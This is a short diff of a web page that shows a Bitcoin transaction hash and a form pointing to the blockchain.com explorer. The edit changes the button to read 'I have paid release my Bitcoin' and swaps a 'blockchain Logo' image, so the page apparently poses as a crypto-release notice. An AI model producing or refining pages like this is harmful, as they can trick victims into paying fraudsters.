@@ -41,11 +41,11 @@ Transaction Hash:**0x7ec8ac921d0e92c[bc1qu8tc4lm3f...kk397a4ymv4]**
 
 
 <form action="https://www.blockchain.com/explorer" method="get">
-  <button type="submit">Submit and Redirect</button>
+  <button type="submit">I have paid release my Bitcoin</button>
 </form>
 
 
-<img src="IMG_8009.jpeg" alt="blockchain Logo" width="700" />
+<img src="IMG_8563.jpeg" alt="blockchain Logo" width="700" />
 
 
 
